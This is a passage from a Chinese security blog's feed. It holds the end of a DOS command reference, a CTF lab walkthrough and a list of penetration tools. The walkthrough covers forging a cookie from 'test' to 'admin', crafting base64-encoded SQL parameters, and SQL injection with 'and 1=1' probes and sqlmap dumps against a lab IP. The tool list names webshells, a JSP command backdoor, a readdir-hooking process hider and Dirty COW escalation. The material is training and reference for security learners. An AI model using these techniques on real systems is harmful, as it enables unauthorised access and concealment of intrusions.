[C:][path]filename1[.ext] filename2[.ext] </p></blockquote><blockquote><p>[说明] 改名操作只限于某个文件某组文件的名称，它不会更改文件所在的目录。 </p></blockquote><p>如果使用了通配符，则对一批文件进行更名。 </p><h2 id="1-8-type"><a href="#1-8-type" class="headerlink" title="1.8 type"></a>1.8 type</h2><blockquote><p>[功能] 在屏幕上显示文本文件内容命令 </p></blockquote><blockquote><p>[格式] type [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] type命令用来在屏幕上快速、简便地显示文本文件的内容，扩展名为TXT的文件是文本文件。 </p></blockquote><p>如果用这个命令显示扩展名为EXE或COM等其它文件， 输出的结果往往是一些乱七八糟的符号并伴有无规则的响铃声，有时甚至会出现死机现象。 </p><h2 id="1-9-format"><a href="#1-9-format" class="headerlink" title="1.9 format"></a>1.9 format</h2><blockquote><p>[功能] 磁盘格式化 </p></blockquote><blockquote><p>[格式] [C:][path]format drive:[/S] </p></blockquote><blockquote><p>[说明] 厂家制造的各种磁盘可用来存储各种操作系统下的文件。不同操作系统的磁盘格式一般是不相同的，是不通用的。format命令就是使一个新的磁盘可以被DOS操作系统识别，即可存储DOS文件。 </p></blockquote><p>这个命令对磁盘的格式化过程，实际上是用DOS规定的信息存储格式对磁盘进行规划的过程。格式化磁盘时，要清除磁盘上已经存在的所有数据，在磁盘上写上引导记录，划分出文件分配表和根目录，同时，它还要找出磁盘上的所有坏扇区并作上不可使用的标记。命令参数我们这里只列出了一个：/S。当使用了这个参数后，磁盘格式化并装入操作系统文件，使之变成引导盘。相当于format后再进行下一命令：SYS。 </p><h2 id="1-10-discopy"><a href="#1-10-discopy" class="headerlink" title="1.10 discopy"></a>1.10 discopy</h2><p>diskcopy，翻译成中文就是磁盘复制 </p><blockquote><p>[功能] 复制出一个和原来磁盘内容一模一样的磁盘 </p></blockquote><blockquote><p>[格式] diskcopy　源驱动器名　目的驱动器名 </p></blockquote><blockquote><p>[说明] 它的主要用途就是用来备份。比如我们的电脑在刚买来时，会随机附带一些设备驱动程序磁盘，这些驱动程序在以后都有可能用到，为防止这些磁盘的损坏，一定要将它们都备份一套，这时，使用diskcopy命令是比较快捷和方便的。 </p></blockquote><h2 id="1-11-deltree"><a href="#1-11-deltree" class="headerlink" title="1.11 deltree"></a>1.11 deltree</h2><blockquote><p>[功能] 删除目录树 </p></blockquote><blockquote><p>[格式] [C:][path]DELTREE [C1:][path1] [[C2:][path2] […]] </p></blockquote><blockquote><p>[说明] 这个命令将整个指定目录树全部消灭，而不管它是否是只读、隐藏与否。使用应特别小心。它是一个危险命令。 </p></blockquote><h2 id="1-12-mem"><a href="#1-12-mem" class="headerlink" title="1.12 mem"></a>1.12 mem</h2><p>mem是memory的缩写 </p><blockquote><p>[功能] 该命令用来查看你的计算机内存有多少，以及内存的使用情况。 </p></blockquote><blockquote><p>[格式] 直接键入mem命令 </p></blockquote><h2 id="1-13-chkdsk"><a href="#1-13-chkdsk" class="headerlink" title="1.13 chkdsk"></a>1.13 chkdsk</h2><p>chkdsk是check disk的缩写。 </p><blockquote><p>[功能] 用来检查你的磁盘的使用情况。 </p></blockquote><blockquote><p>[格式] chkdsk　磁盘名 </p></blockquote><blockquote><p>[说明] 例如要检查A盘使用情况，就输入chkdsk　A: ，检查c盘使用情况，就输入chkdsk　C: ，如果直接输入chkdsk，就检查当前磁盘的使用情况。 </p></blockquote><h2 id="1-14-sys"><a href="#1-14-sys" class="headerlink" title="1.14 sys"></a>1.14 sys</h2><blockquote><p>[功能] 传递系统文件命令。将DOS的两个隐含的系统IO.SYS和MSDOS.SYS传送到目标磁盘的特定位置上，并将COMMAND.COM文件复制过去。完成后，目标盘成为DOS的启动盘。 </p></blockquote><blockquote><p>[格式] [C:][path]SYS [C1:][path] d2: </p></blockquote><blockquote><p>[说明] 由于这几个文件需要复制到特定位置上，所以用COPY命令完成的复制未必能够启动机器。能过SYS命令，DOS可以将目标盘已占据特定位置的文件移动，并将系统文件复制到相应位置上。参数C1ath用来指明系统文件所在目录。如不指明，则缺省为当前盘的当前目录。所以这个命令一般要在源盘的根目录进行。 </p></blockquote><h2 id="1-15-path"><a href="#1-15-path" class="headerlink" title="1.15 path"></a>1.15 path</h2><blockquote><p>[功能] 设定DOS寻找.COM、.EXE、.BAT文件的所在目录 </p></blockquote><blockquote><p>[格式] path=[[drive:]path[;…]]或path </p></blockquote><h2 id="1-16-edit"><a href="#1-16-edit" class="headerlink" title="1.16 edit"></a>1.16 edit</h2><blockquote><p>[功能] edit命令是一个简单的编辑软件，我们经常用它来编辑一些程序和批处理文件。 </p></blockquote><h2 id="1-17-cls"><a href="#1-17-cls" class="headerlink" title="1.17 cls"></a>1.17 cls</h2><blockquote><p>[功能] 清除显示器屏幕上的内容，使DOS提示符到屏幕左上角。 </p></blockquote><blockquote><p>[格式] cls </p></blockquote><h2 id="1-18-time"><a href="#1-18-time" class="headerlink" title="1.18 time"></a>1.18 time</h2><blockquote><p>[功能] 显示和设置DOS的系统时间 </p></blockquote><blockquote><p>[格式] time [hh[:mm[:ss[.cc]]] </p></blockquote><h2 id="1-19-date"><a href="#1-19-date" class="headerlink" title="1.19 date"></a>1.19 date</h2><blockquote><p>[功能] 显示和设置DOS的系统日期 </p></blockquote><blockquote><p>[格式] date [MM-DD-YY] </p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190905113441.png" class="lozad"></p><h2 id="1-20-ver"><a href="#1-20-ver" class="headerlink" title="1.20 ver"></a>1.20 ver</h2><blockquote><p>[功能] 显示正在运行的DOS系统版本号 </p></blockquote><blockquote><p>[格式] ver </p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190905113506.png" class="lozad"></p><h1 id="0x02-其他命令"><a href="#0x02-其他命令" class="headerlink" title="0x02 其他命令"></a>0x02 其他命令</h1><p>attrib…………设置文件属性<br>ctty …………改变控制设备<br>defrag…………磁盘碎片整理<br>doskey…………调用和建立DOS宏命令<br>debug …………程序调试命令<br>emm386…………扩展内存管理<br>fc　　…………文件比较<br>fdisk …………硬盘分区<br>lh/loadhigh …将程序装入高端内存<br>move …………移动文件，改目录名<br>more　…………分屏显示<br>prompt…………设置提示符<br>set 　…………设置环境变量<br>smartdrv………设置磁盘加速器<br>setver…………设置版本<br>subst …………路径替换<br>vol　 …………显示指定的磁盘卷标号<br>xcopy …………拷贝目录和文</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在进行渗透测试的过程中，不免会用到DOS系统下的一些命令，所以这篇文章将常用的DOS命令进行整理归纳，方便他人学习和自己查看。&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://www.mad-coding.cn/categories/Windows/"/>
    
    
      <category term="基础教程" scheme="https://www.mad-coding.cn/tags/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    
      <category term="DOS命令" scheme="https://www.mad-coding.cn/tags/DOS%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>CTF考试用题</title>
    <link href="https://www.mad-coding.cn/2019/09/05/CTF%E8%80%83%E8%AF%95%E7%94%A8%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/09/05/CTF考试用题/</id>
    <published>2019-09-05T03:07:56.000Z</published>
    <updated>2019-09-05T03:14:36.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文是将CTF考题进行整理归纳，方便自己和他人学习使用，有疑问的朋友可以在文章末尾留言交流。</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文是将CTF考题进行整理归纳，方便自己和他人学习使用，有疑问的朋友可以在文章末尾留言交流。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF竞赛试题（跟新中）</title>
    <link href="https://www.mad-coding.cn/2019/09/03/CTF%E7%AB%9E%E8%B5%9B%E8%AF%95%E9%A2%98/"/>
    <id>https://www.mad-coding.cn/2019/09/03/CTF竞赛试题/</id>
    <published>2019-09-03T13:30:27.000Z</published>
    <updated>2019-09-11T12:42:17.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-第一关-不合理的验证方式"><a href="#0x01-第一关-不合理的验证方式" class="headerlink" title="0x01 第一关-不合理的验证方式"></a>0x01 第一关-不合理的验证方式</h1><h2 id="1-1-题目背景"><a href="#1-1-题目背景" class="headerlink" title="1.1 题目背景"></a>1.1 题目背景</h2><p>Web 用户的身份验证，及页面操作权限验证是 B/S 系统的基础功能，一个功<br>能复杂的业务应用系统，通过角色授权来控制用户访问。Web 系统的用户登录<br>及页面操作权限验证在处理逻辑上比较复杂，通过 Session 和 Cookie 存储，以及<br>Session 和 Cookie 的过期处理来控制用户身份 。</p><h2 id="1-2-题目描述"><a href="#1-2-题目描述" class="headerlink" title="1.2  题目描述"></a>1.2  题目描述</h2><p>一个 web 系统中管理员账户：admin 中有一串 key，页面只提供了试用账号<br>密码：test test ，我们需要登录进 admin 账户获取 key 来通过本关。</p><h2 id="1-3-答案提交"><a href="#1-3-答案提交" class="headerlink" title="1.3 答案提交"></a>1.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="1-4-提交key"><a href="#1-4-提交key" class="headerlink" title="1.4 提交key"></a>1.4 提交key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key：I am admin</span><br></pre></td></tr></table></figure><h2 id="1-5-关卡环境"><a href="#1-5-关卡环境" class="headerlink" title="1.5 关卡环境"></a>1.5 关卡环境</h2><ol><li><p>VPC1( 虚拟 PC ）:工具场景：Windows XP 操作系统/BT5</p></li><li><p>VPC2( 虚拟 PC ）:Window server xp</p></li><li><p>软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软<br>件软件到工具场景</p></li><li><p>关卡环境描述:</p><ol><li>学生机与实验室网络直连</li><li>VPC 与实验室网络直连</li><li>学生机与 VPC 物理链路连通</li></ol></li></ol><h2 id="1-6-参考步骤"><a href="#1-6-参考步骤" class="headerlink" title="1.6 参考步骤"></a>1.6 参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213809.png" class="lozad"></p><p>2.使用账号密码：test test 登录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213844.png" class="lozad"></p><p>3.使用 Firefox 的 firebug 插件查看 cookies。发现只有 user 段，值为 test。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213904.png" class="lozad"></p><p>4.将 test 修改为 admin，再次访问页面，得到 key：I am admin</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213933.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903213949.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214009.png" class="lozad"></p><p>Cookie：判断用户信息的凭据，存储在本地</p><p>Test 用户登录产生的 cookie 信息：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214042.png" class="lozad"></p><h1 id="0x02-加密与解密的对抗"><a href="#0x02-加密与解密的对抗" class="headerlink" title="0x02 加密与解密的对抗"></a>0x02 加密与解密的对抗</h1><h2 id="2-1-题目背景"><a href="#2-1-题目背景" class="headerlink" title="2.1 题目背景"></a>2.1 题目背景</h2><p>数据加密的基本过程就是对原来为明文的文件或数据按某种算法进<br>行处理，使其成为不可读的一段代码，通常称为“<strong>密文</strong>”，使其只能在<br>输入相应的密钥之后才能显示出本来内容，通过这样的途径来达到保护<br>数据不被非法人窃取、阅读的目的。 该过程的逆过程为解密，即将该<br>编码信息转化为其原来数据的过程</p><h2 id="2-2-题目描述"><a href="#2-2-题目描述" class="headerlink" title="2.2 题目描述"></a>2.2 题目描述</h2><p>一个 web 页面只给了 2 个奇怪的超链接，访问 2 个连接会导致列表的排序不<br>一样。这一关通过观察页面，构造 url，访问得到 key 通过本关。</p><h2 id="2-3-答案提交"><a href="#2-3-答案提交" class="headerlink" title="2.3 答案提交"></a>2.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="2-4-提交key"><a href="#2-4-提交key" class="headerlink" title="2.4 提交key"></a>2.4 提交key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:hello world</span><br></pre></td></tr></table></figure><h2 id="2-5-关卡环境"><a href="#2-5-关卡环境" class="headerlink" title="2.5 关卡环境"></a>2.5 关卡环境</h2><ol><li>VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5</li><li>VPC2( 虚拟 PC ）: Window server xp</li><li>软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软件软件到工具场景。</li><li>关卡环境描述:<ol><li>学生机与实验室网络直连</li><li>VPC 与实验室网络直连</li><li>学生机与 VPC 物理链路连通</li></ol></li></ol><h2 id="2-6-参考步骤"><a href="#2-6-参考步骤" class="headerlink" title="2.6 参考步骤"></a>2.6 参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214542.png" class="lozad"></p><p>2.通过查看源码，查看 2 个超链接的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3JhbmtpbmcrbGltaXQrMCUyQzQ=</span><br><span class="line"></span><br><span class="line">index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3llYXIrbGltaXQrMCUyQzQ=</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214648.png" class="lozad"></p><p>3.2 个地址的 Word 参数是 base64 加密，将其解密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214808.png" class="lozad"></p><p>4.解密后的字符串：<br><code>SELECT+%2A+FROM+language+order+by+year+limit+0%2C4</code><br>是 <code>url</code> 加密，再次解密：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214841.png" class="lozad"></p><p>5.解密结果是一个 sql 语句。构造新的语句：<br>SELECT * FROM language order by year<br>将其 url 加密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214904.png" class="lozad"></p><p>6.将得到的字符串 base64 加密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903214932.png" class="lozad"></p><p>7.得到的加密串构造地址：</p><p><a href="http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy" target="_blank" rel="noopener">http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy</a><br>8.访问得到 key:hello world 。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215033.png" class="lozad"></p><h1 id="0x03-一个SQL引发的血案"><a href="#0x03-一个SQL引发的血案" class="headerlink" title="0x03 一个SQL引发的血案"></a>0x03 一个SQL引发的血案</h1><h2 id="3-1-题目背景"><a href="#3-1-题目背景" class="headerlink" title="3.1 题目背景"></a>3.1 题目背景</h2><p>SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或<br>页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令，比<br>如先前的很多影视网站泄露 VIP会员密码大多就是通过WEB表单递交查<br>询字符暴出的，这类表单特别容易受到 SQL 注入式攻击。</p><h2 id="3-2-题目描述"><a href="#3-2-题目描述" class="headerlink" title="3.2 题目描述"></a>3.2 题目描述</h2><p>一个 web 页面列了 2014 年 6 月编程语言排行榜。我们需要通过此页面，查<br>询到数据库里的内容，得到 key。</p><h2 id="3-3-答案提交"><a href="#3-3-答案提交" class="headerlink" title="3.3 答案提交"></a>3.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="3-4-提交key"><a href="#3-4-提交key" class="headerlink" title="3.4 提交key"></a>3.4 提交key</h2><p>​    key:I am sql inject</p><h2 id="3-5-关卡环境"><a href="#3-5-关卡环境" class="headerlink" title="3.5 关卡环境"></a>3.5 关卡环境</h2><p>VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5<br>VPC2( 虚拟 PC ） Window server xp<br>软件描述 使用工具场景集成的工具软件，参赛者也可以上传工具软<br>件软件到工具场景。<br>关卡环境描述<br>1、学生机与实验室网络直连<br>2、VPC 与实验室网络直连<br>3、学生机与 VPC 物理链路连通</p><h2 id="3-6参考步骤"><a href="#3-6参考步骤" class="headerlink" title="3.6参考步骤"></a>3.6参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215511.png" class="lozad"></p><p>2.访问超链接：<br><a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a><br>通过修改 id 的值可以查看到相应排名的语言</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215543.png" class="lozad"></p><p>3.访问:<a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a> and 1=1 返回正确内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215614.png" class="lozad"></p><p><a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a> and 1=2 返回错误内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215627.png" class="lozad"></p><p>4.通过上面可以判断存在注入。Kali 下使用 sqlmap 获取数据库内容。<br>使用命令：sqlmap -u “<a href="http://192.168.102.62/index.php?id=1”" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1”</a> –dbs 查看数据库。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215708.png" class="lozad"></p><p>使用命令：sqlmap -u “<a href="http://192.168.102.62/index.php?id=1”" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1”</a> –dump -D “third” 获取数据库内容。得到 key：I am sql inject</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215738.png" class="lozad"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><h2 id="4-1-题目背景"><a href="#4-1-题目背景" class="headerlink" title="4.1 题目背景"></a>4.1 题目背景</h2><h2 id="4-2-题目描述"><a href="#4-2-题目描述" class="headerlink" title="4.2 题目描述"></a>4.2 题目描述</h2><h2 id="4-3-答案提交"><a href="#4-3-答案提交" class="headerlink" title="4.3 答案提交"></a>4.3 答案提交</h2><h2 id="4-4-提交key"><a href="#4-4-提交key" class="headerlink" title="4.4 提交key"></a>4.4 提交key</h2><h2 id="4-5-关卡环境"><a href="#4-5-关卡环境" class="headerlink" title="4.5 关卡环境"></a>4.5 关卡环境</h2><h2 id="4-6参考步骤"><a href="#4-6参考步骤" class="headerlink" title="4.6参考步骤"></a>4.6参考步骤</h2><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h2 id="5-1-题目背景"><a href="#5-1-题目背景" class="headerlink" title="5.1 题目背景"></a>5.1 题目背景</h2><h2 id="5-2-题目描述"><a href="#5-2-题目描述" class="headerlink" title="5.2 题目描述"></a>5.2 题目描述</h2><h2 id="5-3-答案提交"><a href="#5-3-答案提交" class="headerlink" title="5.3 答案提交"></a>5.3 答案提交</h2><h2 id="5-4-提交key"><a href="#5-4-提交key" class="headerlink" title="5.4 提交key"></a>5.4 提交key</h2><h2 id="5-5-关卡环境"><a href="#5-5-关卡环境" class="headerlink" title="5.5 关卡环境"></a>5.5 关卡环境</h2><h2 id="5-6参考步骤"><a href="#5-6参考步骤" class="headerlink" title="5.6参考步骤"></a>5.6参考步骤</h2><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>优秀资源工具整理（不断更新中）</title>
    <link href="https://www.mad-coding.cn/2019/09/03/%E4%BC%98%E7%A7%80%E8%B5%84%E6%BA%90%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"/>
    <id>https://www.mad-coding.cn/2019/09/03/优秀资源工具整理/</id>
    <published>2019-09-03T03:16:04.000Z</published>
    <updated>2019-09-22T10:16:50.681Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，会用到大量的开源工具，每次在各种网站、论坛和知识星球中看到很多很好的工具，都没有时间进行及时的使用整理，久而久之就忘却了，所以使用该文章将每次碰到的优秀工具记录下来，然后在后期在进行归纳整理，既方便他人，也方便自己。皮卡皮卡~</p><a id="more"></a><h1 id="0x01-好用工具"><a href="#0x01-好用工具" class="headerlink" title="0x01 好用工具"></a>0x01 好用工具</h1><h2 id="1-1-B-XSSRF"><a href="#1-1-B-XSSRF" class="headerlink" title="1.1 B-XSSRF"></a>1.1 B-XSSRF</h2><p>用于检测和跟踪Blind XSS，XXE和SSRF的工具包</p><p><a href="https://github.com/SpiderMate/B-XSSRF" target="_blank" rel="noopener">https://github.com/SpiderMate/B-XSSRF</a></p><h2 id="1-2-BurpSuite-collections"><a href="#1-2-BurpSuite-collections" class="headerlink" title="1.2 BurpSuite-collections"></a>1.2 BurpSuite-collections</h2><p>BurpSuite收集：包括不限于Burp文章，破解版，插件（非BApp Store），汉化等相关教程</p><p><a href="https://github.com/Mr-xn/BurpSuite-collections" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections</a></p><h2 id="1-3-排查网盘信息泄露"><a href="#1-3-排查网盘信息泄露" class="headerlink" title="1.3 排查网盘信息泄露"></a>1.3 排查网盘信息泄露</h2><p><a href="https://github.com/dongfangyuxiao/py-study/tree/master/py-study/威胁情报/网盘泄露" target="_blank" rel="noopener">https://github.com/dongfangyuxiao/py-study/tree/master/py-study/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E7%BD%91%E7%9B%98%E6%B3%84%E9%9C%B2</a></p><h2 id="1-4-pocsuite3"><a href="#1-4-pocsuite3" class="headerlink" title="1.4 pocsuite3"></a>1.4 pocsuite3</h2><p>pocsuite3是由Knownsec 404团队开发的开源远程漏洞测试框架</p><p><a href="https://github.com/knownsec/pocsuite3" target="_blank" rel="noopener">https://github.com/knownsec/pocsuite3</a></p><p><strong>进程隐藏工具libprocesshider.so</strong></p><p>此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。</p><h2 id="1-5-进程隐藏工具libprocesshider-so"><a href="#1-5-进程隐藏工具libprocesshider-so" class="headerlink" title="1.5 进程隐藏工具libprocesshider.so"></a>1.5 <strong>进程隐藏工具libprocesshider.so</strong></h2><p>此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。</p><h2 id="1-6-流量代理工具proxy"><a href="#1-6-流量代理工具proxy" class="headerlink" title="1.6 流量代理工具proxy"></a>1.6 <strong>流量代理工具proxy</strong></h2><p>Proxy为Dog Tunnel(狗洞)，<a href="https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具：" target="_blank" rel="noopener">https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具：</a></p><h2 id="1-7-冰蝎一句话木马"><a href="#1-7-冰蝎一句话木马" class="headerlink" title="1.7 冰蝎一句话木马"></a>1.7 <strong>冰蝎一句话木马</strong></h2><p>作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。此次发现的样本为冰蝎JSP一句话木马</p><p><a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder/releases</a></p><h2 id="1-8-JSP-WEB后门live-index-bank3-jsp"><a href="#1-8-JSP-WEB后门live-index-bank3-jsp" class="headerlink" title="1.8  JSP WEB后门live_index_bank3.jsp"></a>1.8  <strong>JSP WEB后门live_index_bank3.jsp</strong></h2><p>这是一个常规的JAVA WEB后门，通过调用.jsp?nox=”命令”来执行命令</p><h2 id="1-9-Linux辅助提权工具LinEnum-sh"><a href="#1-9-Linux辅助提权工具LinEnum-sh" class="headerlink" title="1.9  Linux辅助提权工具LinEnum.sh"></a>1.9  Linux辅助提权工具LinEnum.sh</h2><h2 id="1-10-脏牛提权工具c0w64"><a href="#1-10-脏牛提权工具c0w64" class="headerlink" title="1.10  脏牛提权工具c0w64"></a>1.10  <strong>脏牛提权工具c0w64</strong></h2><h2 id="1-11-内网流量代理工具agent-exe"><a href="#1-11-内网流量代理工具agent-exe" class="headerlink" title="1.11 内网流量代理工具agent.exe"></a>1.11 <strong>内网流量代理工具agent.exe</strong></h2><p>agent.exe是nps工具（<a href="https://github.com/cnlh/nps），" target="_blank" rel="noopener">https://github.com/cnlh/nps），</a></p><p>是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端：</p><h2 id="1-12-dog-tunnel"><a href="#1-12-dog-tunnel" class="headerlink" title="1.12 dog-tunnel"></a>1.12 <strong>dog-tunnel</strong></h2><p>基于KCP的P2P端口映射工具，同时支持SOCKS5代理</p><p><a href="https://github.com/vzex/dog-tunnel/" target="_blank" rel="noopener">https://github.com/vzex/dog-tunnel/</a></p><h2 id="1-13-sqlmap4burp"><a href="#1-13-sqlmap4burp" class="headerlink" title="1.13 sqlmap4burp ++"></a>1.13 sqlmap4burp ++</h2><p>sqlmap4burp ++是一款兼容于Windows，Mac，Linux的多个系统平台的打嗝与SqlMap的联动插件</p><h2 id="1-14-移动安全框架-MobSF"><a href="#1-14-移动安全框架-MobSF" class="headerlink" title="1.14 移动安全框架 - MobSF"></a>1.14 移动安全框架 - MobSF</h2><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation" target="_blank" rel="noopener">https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation</a></p><h2 id="1-15-简单的iOS应用黑盒评估工具"><a href="#1-15-简单的iOS应用黑盒评估工具" class="headerlink" title="1.15 简单的iOS应用黑盒评估工具"></a>1.15 简单的iOS应用黑盒评估工具</h2><p><a href="https://github.com/chaitin/passionfruit" target="_blank" rel="noopener">https://github.com/chaitin/passionfruit</a></p><h1 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h1><p><a href="http://www.sohu.com/a/324075541_609556" target="_blank" rel="noopener">http://www.sohu.com/a/324075541_609556</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在进行渗透测试的过程中，会用到大量的开源工具，每次在各种网站、论坛和知识星球中看到很多很好的工具，都没有时间进行及时的使用整理，久而久之就忘却了，所以使用该文章将每次碰到的优秀工具记录下来，然后在后期在进行归纳整理，既方便他人，也方便自己。皮卡皮卡~&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>优秀文章整理</title>
